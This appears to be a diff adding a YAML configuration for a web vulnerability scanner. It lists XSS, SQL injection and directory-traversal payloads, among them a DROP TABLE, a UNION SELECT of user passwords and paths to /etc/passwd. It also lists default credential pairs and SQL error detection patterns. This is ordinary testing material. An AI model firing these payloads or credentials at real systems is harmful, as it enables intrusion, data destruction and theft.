@@ -1,0 +1,103 @@
+# Web Security Scanner Configuration
+# Modify these settings according to your testing needs
+
+scanner:
+  max_threads: 5
+  request_delay: 1.0  # Delay between requests in seconds
+  timeout: 30  # Request timeout in seconds
+  user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+
+# Payloads for different vulnerability tests
+payloads:
+  xss:
+    - '<script>alert("XSS")</script>'
+    - '"><script>alert("XSS")</script>'
+    - 'javascript:alert("XSS")'
+    - '<img src=x onerror=alert("XSS")>'
+    - '<svg onload=alert("XSS")>'
+    - '"><img src=x onerror=alert("XSS")>'
+    - '<iframe src="javascript:alert(\'XSS\')"></iframe>'
+    - '<body onload="alert(\'XSS\')">'
+    
+  sql_injection:
+    - "' OR '1'='1"
+    - "' OR 1=1--"
+    - "'; DROP TABLE users--"
+    - "' UNION SELECT NULL--"
+    - "admin'--"
+    - "' OR 'x'='x"
+    - "' UNION SELECT username,password FROM users--"
+    - "'; WAITFOR DELAY '00:00:05'--"
+    
+  directory_traversal:
+    - "../../../etc/passwd"
+    - "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
+    - "....//....//....//etc/passwd"
+    - "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+    - "..%2f..%2f..%2fetc%2fpasswd"
+    
+  file_upload:
+    - filename: "test.php"
+      content: "<?php echo 'test'; ?>"
+      mime_type: "text/php"
+    - filename: "test.jsp"
+      content: "<% out.println('test'); %>"
+      mime_type: "text/jsp"
+    - filename: "test.asp"
+      content: "<% Response.Write('test') %>"
+      mime_type: "text/asp"
+    - filename: "test.html"
+      content: "<script>alert('XSS')</script>"
+      mime_type: "text/html"
+
+# Default credentials to test
+default_credentials:
+  - username: "admin"
+    password: "admin"
+  - username: "admin"
+    password: "password"
+  - username: "admin"
+    password: "123456"
+  - username: "root"
+    password: "root"
+  - username: "test"
+    password: "test"
+  - username: "guest"
+    password: "guest"
+
+# Common SQL error patterns to detect
+sql_error_patterns:
+  - "sql syntax"
+  - "mysql_fetch"
+  - "oracle error"
+  - "postgresql error"
+  - "sql server error"
+  - "mysql_num_rows"
+  - "mysql_fetch_array"
+  - "mysql_fetch_object"
+  - "mysql_fetch_assoc"
+  - "mysql_fetch_row"
+
+# CSRF token patterns to look for
+csrf_patterns:
+  - "csrf"
+  - "token"
+  - "_token"
+  - "authenticity_token"
+  - "csrf_token"
+
+# Headers to include in requests
+headers:
+  Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+  Accept-Language: "en-US,en;q=0.5"
+  Accept-Encoding: "gzip, deflate"
+  Connection: "keep-alive"
+  Upgrade-Insecure-Requests: "1"
+
+# Report settings
+report:
+  include_screenshots: false
+  include_response_samples: true
+  max_response_length: 1000
+  save_logs: true
+  export_formats: ["json", "html", "csv"]
